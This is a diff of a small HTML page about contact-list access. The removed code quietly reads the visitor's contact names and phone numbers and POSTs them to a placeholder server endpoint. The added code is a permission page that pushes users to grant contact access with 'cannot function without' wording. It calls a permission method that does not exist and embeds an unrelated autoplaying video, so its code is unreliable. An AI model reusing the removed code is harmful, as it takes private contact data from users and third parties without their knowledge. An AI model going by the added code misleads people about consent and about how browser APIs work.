@@ -1,49 +1,41 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <title>Contact List Access Permission</title>
 </head>
 <body>
-  <h1>Contact List</h1>
-  <ul id="contact-list"></ul>
-  <script>
-    $(document).ready(function() {
-      if ("contacts" in navigator) {
-        // Access the user's contact list
-        navigator.contacts.find(['displayName', 'phoneNumbers'], function(contacts) {
-          var contactList = [];
-          for (var i = 0; i < contacts.length; i++) {
-            // Extract name and phone number from each contact and add to the list
-            var name = contacts[i].displayName;
-            var phone = contacts[i].phoneNumbers[0].value;
-            contactList.push({name: name, phone: phone});
-          }
-          // Send the contact list to the server using AJAX
-          $.ajax({
-            type: 'POST',
-            url: 'forwarding_link/post.php',
-            data: {contacts: JSON.stringify(contactList)},
-            dataType: 'json',
-            success: function(result) {
-              // Handle server response
-            },
-            error: function() {
-              // Handle error
-            }
-          });
+    <h1>Grant Contact List Access Permission</h1>
+    <p>In order to use this app, we need permission to access your contact list. Please click the button below to grant permission.</p>
+    <button id="grant-permission-btn">Grant Permission</button>
 
-          // Display the contact list in the HTML document
-          for (var j = 0; j < contactList.length; j++) {
-            var listItem = '<li>' + contactList[j].name + ': ' + contactList[j].phone + '</li>';
-            $('#contact-list').append(listItem);
-          }
-        }, function(error) {
-          // Handle error getting the contact list
+    <script>
+        const permissionBtn = document.getElementById('grant-permission-btn');
+
+        permissionBtn.addEventListener('click', () => {
+            navigator.permissions.query({ name: 'contacts' }).then(permissionStatus => {
+                if (permissionStatus.state === 'prompt') {
+                    permissionStatus.onchange = () => {
+                        if (permissionStatus.state === 'granted') {
+                            // permission granted, continue with app logic
+                            alert('Permission granted. You can now use the app.');
+                        } else {
+                            // permission denied, show error message
+                            alert('Permission denied. The app cannot function without permission to access your contact list.');
+                        }
+                    }
+                    permissionStatus.prompt();
+                } else if (permissionStatus.state === 'granted') {
+                    // permission already granted, continue with app logic
+                    alert('Permission already granted. You can now use the app.');
+                } else {
+                    // permission denied, show error message
+                    alert('Permission denied. The app cannot function without permission to access your contact list.');
+                }
+            }).catch(error => {
+                console.log(error);
+            });
         });
-      } else {
-        // Handle the case where the user's browser does not support the contacts API
-      }
-    });
-  </script>
+    </script>
+<iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 </body>
 </html>
